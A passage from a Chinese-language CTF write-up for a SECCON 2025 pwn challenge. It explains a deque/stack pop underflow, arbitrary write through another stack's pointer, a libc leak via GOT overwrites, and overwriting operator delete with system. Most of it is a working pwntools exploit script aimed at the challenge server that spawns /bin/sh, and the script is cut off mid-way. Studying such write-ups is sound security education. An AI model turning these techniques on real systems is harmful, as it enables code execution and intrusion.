</span></span><span class=line><span class=cl>    <span class=n>T_pop</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=c1>#THE NEXT T_pop() WILL CRASH</span>
</span></span><span class=line><span class=cl><span class=c1>#BECAUSE  _M_finish-&gt;cur == _M_finish-&gt;first</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>if (this-&gt;_M_finish.cur == this-&gt;_M_finish.first) {
</span></span></span><span class=line><span class=cl><span class=s2>          // 0x401964: call deque_M_pop_back_aux_VULN
</span></span></span><span class=line><span class=cl><span class=s2>          deque_M_pop_back_aux_VULN(this);
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>void deque_M_pop_back_aux_VULN(std_deque* this) {
</span></span></span><span class=line><span class=cl><span class=s2>    // 0x401e6f: call deque_M_deallocate_node
</span></span></span><span class=line><span class=cl><span class=s2>    _M_deallocate_node(this-&gt;_M_finish.first);############# we can&#39;t free 0x0000000000000051
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    // 0x401e80: mov rdx, [rdx+48h]
</span></span></span><span class=line><span class=cl><span class=s2>    // 0x401e84: sub rdx, 8
</span></span></span><span class=line><span class=cl><span class=s2>    unsigned long** new_node = this-&gt;_M_finish.node - 1;
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    // 0x401e8e: call deque_iterator_M_set_node
</span></span></span><span class=line><span class=cl><span class=s2>    _M_set_node(&amp;this-&gt;_M_finish, new_node);
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    // 0x401ea3: mov [rax+30h], rdx
</span></span></span><span class=line><span class=cl><span class=s2>    this-&gt;_M_finish.cur = this-&gt;_M_finish.last - 1;
</span></span></span><span class=line><span class=cl><span class=s2>}
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>0x405380 &lt;T&gt;:    0x000000003e43d510    0x0000000000000008
</span></span></span><span class=line><span class=cl><span class=s2>0x405390 &lt;T+16&gt;:    0x000000003e43d560    0x000000003e43d560
</span></span></span><span class=line><span class=cl><span class=s2>0x4053a0 &lt;T+32&gt;:    0x000000003e43d760    0x000000003e43d528
</span></span></span><span class=line><span class=cl><span class=s2>0x4053b0 &lt;T+48&gt;:    0x0000000000000051(_M_finish.cur)    0x0000000000000051(_M_finish.first)
</span></span></span><span class=line><span class=cl><span class=s2>0x4053c0 &lt;T+64&gt;:    0x0000000000000251    0x000000003e43d508
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span></code></pre></div><p>所以我们肯定的先<code>push</code>，接下来有一个很关键的地方。**map大小不够重新分配时，不会清空原来堆内存里的残留数据，并且他是从中间开始往后写（毕竟底层是<code>deque</code>，还要为前面预留空间，只是对于<code>stack</code>来说不需要）</p><p>所以可以通过堆风水造成这样的布局</p><p><img alt=image-20251215224336036 loading=lazy src=/posts/ctf/secconctf2025-writeup/assets/image-20251215224336036.png></p><p>这时<code>pop</code>溢出后<code>cur</code>指针就不会先变成<code>0x51</code>这样的<code>chunk</code>头了（不知道在说什么的再回看前面的代码段，里面有展示<code>cur</code>指针为<code>0x51</code>），而是会先变成我们可控的地址，所以可以造成任意地址写（但是只能指定一次地址，可以自己思考为什么）</p><blockquote><p>比赛完在discord交流时发现，其实没必要进行堆风水，最开始在输入name时如果输0x800个A，会导致一个unsorted bin，所以可以直接布置一个地址上去。</p></blockquote><p>那么，我们要写什么地方呢？</p><p>答案是写另一个<code>stack</code>的<code>cur</code>指针，比如我们通过<code>stack S</code>写<code>stack T</code>的<code>cur</code>指针，那么就可以通过<code>T push</code>进行任意地址写，写完再通过<code>stack S</code>控制<code>stack T</code>的<code>cur</code>指针，这样就可以造成无限的任意地址写。</p><p>有了任意地址写，如何get shell，我们还没有<code>libc</code>，我们需要<code>leak libc</code>。</p><p>利用任意地址写，将<code>std::string</code>的<code>char* _M_p;</code>写为<code>got</code>表地址，再将<code>operator new</code>的<code>got</code>写为</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>  <span class=n>std</span><span class=o>::</span><span class=n>cout</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;Hello, &#34;</span> <span class=o>&lt;&lt;</span> <span class=n>name</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;!&#34;</span> <span class=o>&lt;&lt;</span> <span class=n>std</span><span class=o>::</span><span class=n>endl</span><span class=p>;</span>
</span></span></code></pre></div><p>地址（为什么写<code>operator new</code>而不是<code>exit</code>？因为这道题没有<code>exit</code>的<code>got</code>表&mldr;&mldr;）</p><p>利用<code>S push</code>触发<code>malloc</code>回到<code>main</code>即可泄露<code>libc</code>（仔细看源码你会发现，他是先<code>malloc</code>再调整指针写数据，触发<code>malloc</code>就回到<code>main</code>函数了，没有调整指针写数据的环节，所以不会影响接下来的任意写）</p><p>继续利用任意地址写，往一个<code>bss</code>地址写入<code>/bin/sh</code>，再将<code>operator delete</code>写为<code>system</code></p><p>接着利用<code>stack S</code>将<code>stack T</code>的<code>cur</code>和<code>first</code>指针都写为<code>bss</code>地址，进行一次<code>T pop</code>即可触发<code>operator delete(bss)</code>，也就是<code>system(/bin/sh)</code></p><p>此时发现栈没对齐，<code>system</code>失败了，于是再在之前增加一步，再触发一次<code>malloc</code>跳回</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>  <span class=n>std</span><span class=o>::</span><span class=n>cout</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;Hello, &#34;</span> <span class=o>&lt;&lt;</span> <span class=n>name</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;!&#34;</span> <span class=o>&lt;&lt;</span> <span class=n>std</span><span class=o>::</span><span class=n>endl</span><span class=p>;</span>
</span></span></code></pre></div><p>达到调整栈帧的目的，再执行<code>system(/bin/sh)</code>即可</p><p>exp</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwncli</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>os</span><span class=o>=</span><span class=s1>&#39;linux&#39;</span><span class=p>,</span><span class=n>arch</span> <span class=o>=</span> <span class=s1>&#39;amd64&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#context.terminal = [&#39;tmux&#39;, &#39;new-window&#39;, &#39;-n&#39;, &#39;debug&#39; ]</span>
</span></span><span class=line><span class=cl><span class=n>filename</span> <span class=o>=</span> <span class=s2>&#34;st&#34;</span> <span class=o>+</span> <span class=s2>&#34;_patched&#34;</span>
</span></span><span class=line><span class=cl><span class=n>libcname</span> <span class=o>=</span> <span class=s2>&#34;/home/wgg/.config/cpwn/pkgs/2.39-0ubuntu8.5/amd64/libc6_2.39-0ubuntu8.5_amd64/usr/lib/x86_64-linux-gnu/libc.so.6&#34;</span>
</span></span><span class=line><span class=cl><span class=n>host</span> <span class=o>=</span> <span class=s2>&#34;st.seccon.games&#34;</span>
</span></span><span class=line><span class=cl><span class=n>port</span> <span class=o>=</span> <span class=mi>5000</span>
</span></span><span class=line><span class=cl><span class=n>elf</span> <span class=o>=</span> <span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>filename</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>libcname</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>libcname</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>gs</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>set debug-file-directory /home/wgg/.config/cpwn/pkgs/2.39-0ubuntu8.5/amd64/libc6-dbg_2.39-0ubuntu8.5_amd64/usr/lib/debug
</span></span></span><span class=line><span class=cl><span class=s1>set directories /home/wgg/.config/cpwn/pkgs/2.39-0ubuntu8.5/amd64/glibc-source_2.39-0ubuntu8.5_all/usr/src/glibc/glibc-2.39
</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>base</span><span class=p>(</span><span class=n>name</span><span class=p>,</span> <span class=n>data</span><span class=p>,</span> <span class=n>offset</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>isinstance</span><span class=p>(</span><span class=n>data</span><span class=p>,</span> <span class=nb>bytes</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>name</span> <span class=o>==</span> <span class=s2>&#34;canary&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>base</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>base</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>data</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span> <span class=o>*</span> <span class=mi>2</span><span class=p>)</span> <span class=o>-</span> <span class=n>offset</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=nb>isinstance</span><span class=p>(</span><span class=n>data</span><span class=p>,</span> <span class=nb>int</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>base</span> <span class=o>=</span> <span class=n>data</span> <span class=o>-</span> <span class=n>offset</span>
</span></span><span class=line><span class=cl>    <span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>name</span><span class=si>}</span><span class=s2> = &#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>base</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>base</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>format_extract</span><span class=p>(</span><span class=n>data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;0x[0-9a-fA-F]</span><span class=si>{12}</span><span class=s1>&#39;</span><span class=p>,</span> <span class=n>data</span><span class=p>)</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>sa</span><span class=p>(</span><span class=n>io</span><span class=p>,</span> <span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>sla</span><span class=p>(</span><span class=n>io</span><span class=p>,</span> <span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>ru</span><span class=p>(</span><span class=n>io</span><span class=p>,</span> <span class=n>a</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=n>a</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>start</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>GDB</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>gdb</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>,</span> <span class=n>gdbscript</span> <span class=o>=</span> <span class=n>gs</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>args</span><span class=o>.</span><span class=n>REMOTE</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>process</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>fill_stack</span><span class=p>(</span><span class=n>stack_name</span><span class=p>,</span> <span class=n>data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>s_idx</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>t_idx</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>stack_name</span> <span class=o>==</span> <span class=s1>&#39;S&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>64</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>S_push</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>s_idx</span> <span class=o>+=</span> <span class=mi>64</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>64</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>T_push</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>t_idx</span> <span class=o>+=</span> <span class=mi>64</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>pop_stack</span><span class=p>(</span><span class=n>stack_name</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>s_idx</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>t_idx</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>stack_name</span> <span class=o>==</span> <span class=s1>&#39;S&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>64</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>S_pop</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>s_idx</span> <span class=o>-=</span> <span class=mi>64</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>64</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>T_pop</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>t_idx</span> <span class=o>-=</span> <span class=mi>64</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>S_push</span><span class=p>(</span><span class=n>v</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=c1>#sleep(0.01)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=mi>1</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=c1>#sleep(0.01)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>v</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>S_pop</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=c1>#sleep(0.01)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=mi>2</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>T_push</span><span class=p>(</span><span class=n>v</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=c1>#sleep(0.01)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=mi>3</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=c1>#sleep(0.01)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>v</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>T_pop</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=c1>#sleep(0.01)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=mi>4</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>  // Deque 迭代器结构 (0x20 bytes)
</span></span></span><span class=line><span class=cl><span class=s2>  struct _Deque_iterator {
</span></span></span><span class=line><span class=cl><span class=s2>      unsigned long *cur;    // +0x00: 当前位置指针
</span></span></span><span class=line><span class=cl><span class=s2>      unsigned long *first;  // +0x08: buffer 起始
</span></span></span><span class=line><span class=cl><span class=s2>      unsigned long *last;   // +0x10: buffer 结束
</span></span></span><span class=line><span class=cl><span class=s2>      unsigned long **node;  // +0x18: map 中的 node 指针
</span></span></span><span class=line><span class=cl><span class=s2>  };
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>  // Deque 主结构 (0x60 bytes)
</span></span></span><span class=line><span class=cl><span class=s2>  struct std_deque {
</span></span></span><span class=line><span class=cl><span class=s2>      unsigned long **_M_map;           // +0x00: map 数组指针
</span></span></span><span class=line><span class=cl><span class=s2>      unsigned long _M_map_size;        // +0x08: map 大小
</span></span></span><span class=line><span class=cl><span class=s2>      struct _Deque_iterator _M_start;  // +0x10: 起始迭代器
</span></span></span><span class=line><span class=cl><span class=s2>      struct _Deque_iterator _M_finish; // +0x30: 结束迭代器
</span></span></span><span class=line><span class=cl><span class=s2>  };
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>s_idx</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>t_idx</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>name_addr</span> <span class=o>=</span> <span class=mh>0x0000000000405300</span>
</span></span><span class=line><span class=cl><span class=n>S_addr</span> <span class=o>=</span> <span class=mh>0x0000000000405320</span>
</span></span><span class=line><span class=cl><span class=n>T_addr</span> <span class=o>=</span> <span class=mh>0x0000000000405380</span>
</span></span><span class=line><span class=cl><span class=n>atexit_addr</span> <span class=o>=</span> <span class=mh>0x0000000000405020</span>
</span></span><span class=line><span class=cl><span class=n>main_addr</span> <span class=o>=</span> <span class=mh>0x401376</span>
</span></span><span class=line><span class=cl><span class=n>libc_start_main_got</span> <span class=o>=</span> <span class=mh>0x404FD8</span>
</span></span><span class=line><span class=cl><span class=n>delete_addr</span> <span class=o>=</span> <span class=mh>0x405040</span>
</span></span><span class=line><span class=cl><span class=n>new_got</span> <span class=o>=</span> <span class=mh>0x405038</span>
</span></span><span class=line><span class=cl><span class=n>cout_addr</span> <span class=o>=</span> <span class=mh>0x4013D5</span>
</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>start</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>name</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span> <span class=mh>0x20</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=n>io</span><span class=p>,</span> <span class=s2>&#34;What&#39;s your name?</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>name</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>25</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>fill_stack</span><span class=p>(</span><span class=s1>&#39;S&#39;</span><span class=p>,</span> <span class=mh>0x1337</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>13</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>fill_stack</span><span class=p>(</span><span class=s1>&#39;T&#39;</span><span class=p>,</span> <span class=mh>0xdeadbeef</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>32</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>T_push</span><span class=p>(</span><span class=mh>0xcafebabe</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>4</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>T_push</span><span class=p>(</span><span class=mh>0xAAAAAAAA</span><span class=p>)</span> 
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>20</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>T_push</span><span class=p>(</span><span class=mh>0xffffffff</span><span class=p>)</span>  <span class=c1>##################control</span>
</span></span><span class=line><span class=cl>    <span class=n>T_push</span><span class=p>(</span><span class=n>T_addr</span> <span class=o>-</span> <span class=mh>0x1f8</span> <span class=o>+</span> <span class=mh>0x30</span> <span class=o>+</span> <span class=mh>0x10</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>7</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>T_push</span><span class=p>(</span><span class=mh>0xcccccccc</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>32</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>T_push</span><span class=p>(</span><span class=mh>0xdeadbeef</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>14</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>pop_stack</span><span class=p>(</span><span class=s1>&#39;T&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>fill_stack</span><span class=p>(</span><span class=s1>&#39;S&#39;</span><span class=p>,</span> <span class=mh>0x1337</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>14</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>pop_stack</span><span class=p>(</span><span class=s1>&#39;S&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>12</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>pop_stack</span><span class=p>(</span><span class=s1>&#39;S&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>S_pop</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>S_pop</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#arbitrary write</span>
</span></span><span class=line><span class=cl><span class=n>S_pop</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>S_push</span><span class=p>(</span><span class=n>name_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>T_push</span><span class=p>(</span><span class=n>libc_start_main_got</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#arbitrary write</span>
</span></span><span class=line><span class=cl><span class=n>S_pop</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>S_push</span><span class=p>(</span><span class=n>new_got</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>T_push</span><span class=p>(</span><span class=n>cout_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>S_push</span><span class=p>(</span><span class=mh>0x405000</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>S_push</span><span class=p>(</span><span class=mh>0xffffffff</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#trigger malloc</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Hello, &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Hello, &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc_base</span> <span class=o>=</span> <span class=n>base</span><span class=p>(</span><span class=s2>&#34;libc_base&#34;</span><span class=p>,</span> <span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>6</span><span class=p>),</span> <span class=mh>0x2a200</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>S_pop</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>S_pop</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#arbitrary write</span>
</span></span><span class=line><span class=cl><span class=n>S_pop</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>S_push</span><span class=p>(</span><span class=n>delete_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>T_push</span><span class=p>(</span><span class=n>libc_base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>bss</span> <span class=o>=</span> <span class=mh>0x405500</span>
</span></span><span class=line><span class=cl><span class=c1>#arbitrary write</span>
</span></span><span class=line><span class=cl><span class=c1>#S_pop()</span>
</span></span><span class=line><span class=cl><span class=c1>#S_push(bss)</span>
</span></span><span class=line><span class=cl><span class=c1>#T_push(u64(b&#39;/bin/sh\x00&#39;))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>S_push</span><span class=p>(</span><span class=n>bss</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>S_push</span><span class=p>(</span><span class=n>bss</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>S_push</span><span class=p>(</span><span class=n>bss</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>S_pop</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>S_pop</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>S_pop</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>S_push</span><span class=p>(</span><span class=n>bss</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>T_push</span><span class=p>(</span><span class=n>u64</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>S_push</span><span class=p>(</span><span class=n>bss</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>S_push</span><span class=p>(</span><span class=n>bss</span><span class=p>)</span>
